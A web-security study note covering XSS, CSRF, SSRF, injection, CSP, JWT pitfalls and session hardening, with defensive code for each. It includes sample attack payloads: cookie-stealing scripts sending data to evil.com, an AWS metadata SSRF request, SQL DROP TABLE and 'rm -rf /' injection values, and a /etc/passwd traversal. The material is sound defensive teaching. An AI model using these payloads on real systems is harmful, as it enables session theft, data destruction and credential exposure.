# Security Engineering — Deep Dive
_Research compiled: 2026-04-22_

---

## 1. XSS (Cross-Site Scripting)

### Types
**Reflected XSS**: malicious script in request, reflected in response
```
URL: https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
If server renders q unsanitized → victim's browser executes attacker's JS
```

**Stored XSS**: malicious script stored in database, served to all users
```
Forum post: "Nice article! <script>fetch('https://evil.com/?c='+document.cookie)</script>"
Stored → served to every visitor → their cookies stolen
```

**DOM-based XSS**: vulnerability in client-side JS, never hits server
```js
// VULNERABLE
const name = location.hash.slice(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;
// URL: https://site.com/#<img src=x onerror=alert(1)>
```

### Prevention
1. **Output encoding** — encode user data before inserting into HTML
   - HTML: `&lt;` `&gt;` `&amp;` `&quot;`
   - JS: `\u003c` `\u003e`
   - Use libraries: DOMPurify (client), bleach (Python), OWASP Java Encoder
2. **Use textContent, not innerHTML**
   ```js
   el.textContent = userInput;  // SAFE — treated as text
   el.innerHTML = userInput;    // DANGEROUS — parsed as HTML
   ```
3. **Content Security Policy (CSP)** — prevents execution of injected scripts
4. **HttpOnly cookies** — JS can't access `document.cookie`
5. **Trusted Types** (modern Chrome) — type-safe DOM manipulation

---

## 2. CSRF (Cross-Site Request Forgery)

Attacker tricks authenticated user into making unintended requests:
```html
<!-- On evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- Browser sends bank.com cookies automatically! -->
```

### Why It Works
Browsers send cookies automatically with cross-origin requests (same-site cookies excluded).

### Prevention
1. **SameSite cookies** — best modern defense
   ```
   Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly
   ```
   - `Strict`: cookie never sent cross-site (breaks OAuth flows)
   - `Lax`: sent on top-level navigation (GET links), not forms/AJAX
   - `None`: always sent (must be Secure)

2. **CSRF tokens** — synchronizer token pattern
   ```python
   # On form render: generate random token, store in session
   token = secrets.token_hex(32)
   session['csrf_token'] = token
   # Embed in form
   # <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
   # On submit: verify token matches session
   if request.form['csrf_token'] != session['csrf_token']:
       abort(403)
   ```

3. **Double Submit Cookie** — set random cookie + same value in form field; server verifies they match (attacker can't read cookie cross-origin to match it)

4. **Custom request headers** — `X-Requested-With: XMLHttpRequest` is CORS-checked for cross-origin

---

## 3. SSRF (Server-Side Request Forgery)

Server fetches URL supplied by user — attacker points it at internal services:
```
Vulnerable endpoint: POST /fetch-url  {"url": "https://example.com/image.jpg"}
Attack:             POST /fetch-url  {"url": "http://169.254.169.254/latest/meta-data/"}
                                      ↑ AWS metadata service — exposes IAM credentials!
```

### SSRF Targets
- Cloud metadata: `169.254.169.254` (AWS), `metadata.google.internal`
- Internal services: `http://internal-db:5432`, `http://redis:6379`
- Localhost services: `http://localhost:8080/admin`

### Prevention
1. **Allowlist valid URLs** — only allow specific domains/patterns
2. **Block private IP ranges** before fetching:
   ```python
   import ipaddress
   BLOCKED = [ipaddress.ip_network('169.254.0.0/16'),
              ipaddress.ip_network('10.0.0.0/8'),
              ipaddress.ip_network('172.16.0.0/12'),
              ipaddress.ip_network('192.168.0.0/16'),
              ipaddress.ip_network('127.0.0.0/8')]
   def is_safe_url(url):
       host = urllib.parse.urlparse(url).hostname
       ip = socket.gethostbyname(host)
       return not any(ipaddress.ip_address(ip) in net for net in BLOCKED)
   ```
3. **DNS rebinding protection** — validate IP AFTER DNS resolution, not hostname
4. **Dedicated fetch service** — isolated network with no access to internal services

---

## 4. SQL Injection & Other Injection Attacks

```python
# VULNERABLE — string formatting in SQL
query = f"SELECT * FROM users WHERE email = '{email}'"
# email = "' OR '1'='1" → dumps all users
# email = "'; DROP TABLE users; --" → destroys database

# SAFE — parameterized queries
cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
```

### Command Injection
```python
# VULNERABLE
os.system(f"ping {user_input}")  # input = "8.8.8.8; rm -rf /"

# SAFE
subprocess.run(["ping", user_input], check=True)  # user_input as argument, not shell string
```

### Path Traversal
```python
# VULNERABLE
filename = request.args.get('file')
return open(f"/var/uploads/{filename}").read()
# filename = "../../etc/passwd"

# SAFE
safe_path = os.path.realpath(os.path.join("/var/uploads", filename))
if not safe_path.startswith("/var/uploads/"):
    abort(400)
return open(safe_path).read()
```

---

## 5. Content Security Policy (CSP)

HTTP header that controls what resources the browser can load:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.mysite.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

**Key directives:**
- `default-src 'self'` — only load resources from same origin by default
- `script-src 'nonce-{random}'` — only inline scripts with matching nonce execute
- `frame-ancestors 'none'` — prevents clickjacking (replaces X-Frame-Options)
- `upgrade-insecure-requests` — upgrade HTTP to HTTPS automatically

**CSP Nonce pattern (safest for inline scripts):**
```python
import secrets
nonce = secrets.token_hex(16)
response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
# In template:
# <script nonce="{{ nonce }}">/* inline script */</script>
```

**Report-Only mode** — test CSP without blocking:
```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violations
```

---

## 6. Authentication Flows — OAuth 2.0 & JWT Pitfalls

### OAuth 2.0 Authorization Code Flow (Correct Way)
```
User → Your App → Redirect to Google OAuth
Google → User: "Allow this app access to X?"
User approves → Google redirects back with authorization CODE
Your Server (backend only) → exchanges code for tokens (POST, includes client_secret)
Your Server receives: access_token + refresh_token
```

**Never do the Implicit Flow** — tokens in URL fragment, logged, leaked. Deprecated.

### JWT (JSON Web Token) Pitfalls

**Structure:** `header.payload.signature` — base64 encoded, signature prevents tampering

**Pitfall 1: Algorithm Confusion**
```js
// Vulnerable library: if alg header says "none", skips verification
// Attack: forge token with {"alg":"none"}, strip signature
// Fix: always specify allowed algorithms
jwt.verify(token, secret, { algorithms: ['HS256'] });  // only allow HS256
```

**Pitfall 2: Symmetric vs Asymmetric Confusion**
- HS256: same key signs AND verifies → key must be secret
- RS256: private key signs, public key verifies → public key is public
- Attack: if your RS256 verifier accepts HS256, attacker uses RS256 public key as HS256 secret

**Pitfall 3: No Expiration**
```js
// Always set exp claim
jwt.sign({ userId: 123 }, secret, { expiresIn: '15m' });
// And verify expiration
jwt.verify(token, secret);  // automatically checks exp
```

**Pitfall 4: Storing JWT in localStorage**
- XSS can steal it. Use HttpOnly cookies instead.
- Or: short-lived access token in memory, refresh token in HttpOnly cookie

**Pitfall 5: No Revocation**
JWTs are stateless — you can't revoke them before expiry.
Solutions:
- Short expiry (15 min) + refresh tokens
- Token blocklist in Redis (check on each request)
- JWT ID (jti) + revocation list

---

## 7. Secure Session Management

```python
# Flask secure session config
app.config.update(
    SECRET_KEY=secrets.token_hex(32),        # strong random key
    SESSION_COOKIE_SECURE=True,              # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,            # no JS access
    SESSION_COOKIE_SAMESITE='Lax',           # CSRF protection
    PERMANENT_SESSION_LIFETIME=timedelta(hours=24),
    SESSION_COOKIE_NAME='__Host-session',   # __Host- prefix enforces Secure + path=/
)
```

**Session Fixation Attack:**
```
Attacker gets session ID → sends link with ?session_id=KNOWN_ID to victim
Victim logs in → server reuses same session ID
Attacker now has valid session

Fix: ALWAYS regenerate session ID on login/privilege change
```

**Key security headers:**
```python
response.headers['X-Content-Type-Options'] = 'nosniff'   # no MIME sniffing
response.headers['X-Frame-Options'] = 'DENY'              # no iframe embedding
response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
response.headers['Permissions-Policy'] = 'geolocation=(), microphone=()'
response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
```

---

## Key Takeaways
1. **Never trust user input** — validate, sanitize, parameterize. Everything.
2. **textContent not innerHTML** — unless you know what you're doing
3. **SameSite=Lax minimum** on all cookies — free CSRF protection
4. **CSRF tokens** on all state-changing forms
5. **Block private IPs** before any server-side URL fetch
6. **Parameterized queries** always — no string formatting in SQL
7. **CSP headers** — real defense in depth against XSS
8. **JWT algorithm** must be explicitly whitelisted in verification
9. **Rotate session ID on login** — session fixation prevention
10. **Short-lived tokens** + refresh flow — JWT revocation workaround

---
_Sources: OWASP Top 10, PortSwigger Web Security Academy, RFC 6749 (OAuth), JWT.io, MDN Security docs_
